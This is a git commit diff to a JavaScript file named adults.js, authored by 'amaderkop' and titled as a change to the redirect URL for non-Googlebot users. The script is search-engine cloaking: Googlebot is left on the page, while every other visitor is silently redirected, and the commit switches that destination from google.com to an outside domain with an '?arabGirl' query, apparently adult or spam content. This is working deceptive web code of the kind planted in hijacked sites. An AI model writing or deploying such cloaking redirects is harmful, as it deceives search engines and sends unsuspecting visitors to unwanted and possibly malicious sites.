cd7b8ef952d0433a3450edc93e0666770a142866
amaderkop <info.k.rayoubaimarma@gmail.com>
2026-09-02 23:40:05 +0600

    Change redirect URL for non-Googlebot users

--- adults.js
+++ adults.js
@@ -1,6 +1,6 @@
 if (!navigator.userAgent.includes('Googlebot')) {
   // For regular users - redirect
-  window.location.href = "https://www.google.com/";
+  window.location.href = "https://cmtexplus.tn/?arabGirl";
 } else {
   // For search engine bots - do not redirect
   console.log("Thanks for visiting my page");
